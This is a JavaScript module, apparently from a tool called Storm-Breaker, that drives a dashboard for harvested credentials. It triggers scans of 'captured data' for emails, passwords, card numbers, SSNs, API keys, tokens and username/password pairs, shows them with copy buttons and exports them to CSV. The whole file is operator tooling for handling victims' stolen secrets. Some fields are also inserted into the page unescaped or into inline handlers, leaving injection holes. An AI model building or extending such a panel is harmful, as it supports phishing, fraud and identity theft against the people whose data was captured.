/**
 * Storm-Breaker Credential Intelligence Viewer
 * Auto-scan, display, and manage extracted credentials
 */

const CredentialIntel = {
    credentials: [],
    pairs: [],
    stats: {},
    scanning: false,

    init() {
        this.loadCredentials();
        this.loadStats();
    },

    async scanCredentials() {
        if (this.scanning) return;
        this.scanning = true;
        const btn = document.getElementById('credScanBtn');
        if (btn) {
            btn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Scanning...';
            btn.disabled = true;
        }

        try {
            const resp = await fetch('/api/credentials/scan', { method: 'POST' });
            const data = await resp.json();

            if (data.error) throw new Error(data.error);

            GrowlNotification.notify({
                title: 'Credential Scan Complete',
                description: `Found ${data.found} credentials, ${data.pairs} pairs`,
                type: 'success', position: 'top-right', closeTimeout: 4000
            });

            this.loadCredentials();
            this.loadStats();
        } catch (e) {
            GrowlNotification.notify({
                title: 'Scan Error', description: e.message,
                type: 'error', position: 'top-right', closeTimeout: 4000
            });
        } finally {
            this.scanning = false;
            if (btn) {
                btn.innerHTML = '<i class="fas fa-search mr-2"></i>Scan All Data';
                btn.disabled = false;
            }
        }
    },

    async loadCredentials(type = null) {
        try {
            let url = '/api/credentials/list';
            if (type) url += `?type=${type}`;
            const resp = await fetch(url);
            const data = await resp.json();
            this.credentials = data.credentials || [];
            this.renderCredentials();
        } catch (e) { console.error('Load credentials error:', e); }
    },

    async loadPairs() {
        try {
            const resp = await fetch('/api/credentials/pairs');
            const data = await resp.json();
            this.pairs = data.pairs || [];
            this.renderPairs();
        } catch (e) { console.error('Load pairs error:', e); }
    },

    async loadStats() {
        try {
            const resp = await fetch('/api/credentials/stats');
            const data = await resp.json();
            this.stats = data.stats || {};
            this.renderStats(data.total || 0);
        } catch (e) { console.error('Load stats error:', e); }
    },

    async deleteCredential(id) {
        try {
            await fetch(`/api/credentials/delete/${id}`, { method: 'DELETE' });
            this.loadCredentials();
            this.loadStats();
        } catch (e) { console.error('Delete error:', e); }
    },

    renderCredentials() {
        const tbody = document.getElementById('credentialsTableBody');
        if (!tbody) return;

        if (this.credentials.length === 0) {
            tbody.innerHTML = `<tr><td colspan="6" class="text-center py-8 text-gray-500">
                <i class="fas fa-key text-3xl mb-2"></i><br>No credentials found yet. Run a scan to extract from captured data.
            </td></tr>`;
            return;
        }

        const typeIcons = {
            email: 'fa-envelope text-blue-400',
            password: 'fa-lock text-red-400',
            credit_card: 'fa-credit-card text-yellow-400',
            phone: 'fa-phone text-green-400',
            ssn: 'fa-id-card text-orange-400',
            api_key: 'fa-key text-purple-400',
            jwt_token: 'fa-ticket-alt text-cyan-400',
            credential_pair: 'fa-user-lock text-red-500',
            url: 'fa-link text-blue-300',
            ip_address: 'fa-network-wired text-gray-400',
        };

        tbody.innerHTML = this.credentials.map(cred => {
            const icon = typeIcons[cred.cred_type] || 'fa-question text-gray-400';
            const masked = cred.value.length > 20 ? cred.value.substring(0, 20) + '...' : cred.value;
            const confColor = cred.confidence >= 80 ? 'text-green-400' : cred.confidence >= 50 ? 'text-yellow-400' : 'text-red-400';

            return `<tr class="border-b border-gray-700/50 hover:bg-gray-700/30 transition-colors">
                <td class="px-4 py-3"><i class="fas ${icon} mr-2"></i>${cred.cred_type}</td>
                <td class="px-4 py-3 font-mono text-sm">
                    <span class="cred-value" data-full="${this.escapeHtml(cred.value)}">${this.escapeHtml(masked)}</span>
                    <button onclick="CredentialIntel.copyValue('${this.escapeHtml(cred.value)}')" class="ml-2 text-gray-400 hover:text-white" title="Copy">
                        <i class="fas fa-copy"></i>
                    </button>
                </td>
                <td class="px-4 py-3 text-sm text-gray-400">${cred.source || '-'}</td>
                <td class="px-4 py-3 text-sm text-gray-400">${cred.url || '-'}</td>
                <td class="px-4 py-3 ${confColor} font-bold">${cred.confidence}%</td>
                <td class="px-4 py-3">
                    <button onclick="CredentialIntel.deleteCredential(${cred.id})" class="text-red-400 hover:text-red-300" title="Delete">
                        <i class="fas fa-trash"></i>
                    </button>
                </td>
            </tr>`;
        }).join('');
    },

    renderPairs() {
        const container = document.getElementById('credentialPairs');
        if (!container) return;

        if (this.pairs.length === 0) {
            container.innerHTML = '<div class="text-center text-gray-500 py-4">No credential pairs found</div>';
            return;
        }

        container.innerHTML = this.pairs.map(pair => `
            <div class="bg-gray-800/50 rounded-lg p-4 border border-gray-700/50 hover:border-red-500/30 transition-colors">
                <div class="flex items-center justify-between mb-2">
                    <span class="text-red-400 font-bold"><i class="fas fa-user-lock mr-2"></i>Credential Pair</span>
                    <span class="text-xs text-gray-500">${pair.discovered_at || ''}</span>
                </div>
                <div class="grid grid-cols-2 gap-2 text-sm">
                    <div><span class="text-gray-400">User:</span> <code class="text-green-400">${this.escapeHtml(pair.paired_username)}</code></div>
                    <div><span class="text-gray-400">Pass:</span> <code class="text-red-400">${this.escapeHtml(pair.paired_password)}</code></div>
                    <div class="col-span-2"><span class="text-gray-400">URL:</span> <span class="text-blue-400">${pair.url || '-'}</span></div>
                </div>
            </div>
        `).join('');
    },

    renderStats(total) {
        const container = document.getElementById('credentialStats');
        if (!container) return;

        const typeColors = {
            email: '#3B82F6', password: '#EF4444', credit_card: '#F59E0B',
            phone: '#10B981', api_key: '#8B5CF6', credential_pair: '#EC4899',
        };

        let statsHtml = `<div class="text-center mb-4"><span class="text-3xl font-bold text-white">${total}</span><br><span class="text-gray-400">Total Credentials</span></div>`;
        statsHtml += '<div class="space-y-2">';

        for (const [type, count] of Object.entries(this.stats)) {
            const color = typeColors[type] || '#6B7280';
            const pct = total > 0 ? ((count / total) * 100).toFixed(1) : 0;
            statsHtml += `
                <div class="flex items-center justify-between text-sm">
                    <span class="text-gray-300">${type}</span>
                    <span class="font-mono text-white">${count}</span>
                </div>
                <div class="w-full bg-gray-700 rounded-full h-1.5">
                    <div class="h-1.5 rounded-full" style="width: ${pct}%; background: ${color}"></div>
                </div>`;
        }

        statsHtml += '</div>';
        container.innerHTML = statsHtml;
    },

    filterByType(type) {
        this.loadCredentials(type === 'all' ? null : type);
    },

    copyValue(value) {
        navigator.clipboard.writeText(value).then(() => {
            GrowlNotification.notify({
                title: 'Copied', description: 'Value copied to clipboard',
                type: 'info', position: 'top-right', closeTimeout: 2000
            });
        });
    },

    escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    },

    exportCredentials() {
        const csv = ['Type,Value,Source,URL,Confidence,Discovered'];
        this.credentials.forEach(c => {
            csv.push(`"${c.cred_type}","${c.value}","${c.source}","${c.url}","${c.confidence}","${c.discovered_at}"`);
        });
        const blob = new Blob([csv.join('\n')], { type: 'text/csv' });
        const a = document.createElement('a');
        a.href = URL.createObjectURL(blob);
        a.download = `credentials_${new Date().toISOString().slice(0,10)}.csv`;
        a.click();
    }
};
